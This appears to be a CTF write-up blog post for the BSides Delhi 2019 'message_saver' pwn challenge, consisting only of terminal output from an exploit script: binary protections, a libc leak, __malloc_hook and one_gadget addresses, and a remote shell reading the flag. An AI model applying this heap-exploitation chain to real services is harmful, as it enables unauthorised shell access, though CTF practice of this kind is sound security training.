---
layout: post
title:  "BSides Delhi 2019: message_saver"
date:   2019-09-29 00:19:30 +0800
categories: pwn
tags: BSides-Delhi-2019
---

```sh
vagrant@ubuntu-xenial:/ctf/pwn-and-rev/bsides_delhi2019/message_saver$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-rev/bsides_delhi2019/message_saver/message_saver'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/pwn-and-rev/bsides_delhi2019/message_saver/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 35.226.111.216 on port 4444: Done
[*] Libc leak: 0x7f8fca9d0b78
[*] Libc base: 0x7f8fca60c000
[*] __malloc_hook: 0x7f8fca9d0aed
[*] one_gadget: 0x7f8fca6fc2a4
[*] Switching to interactive mode
$ ls
chall
flag
run.sh
$ cat flag
bsides_delhi{u4f_1s_d4ng3r0us_4ft3r_4ll!!}
$  
```
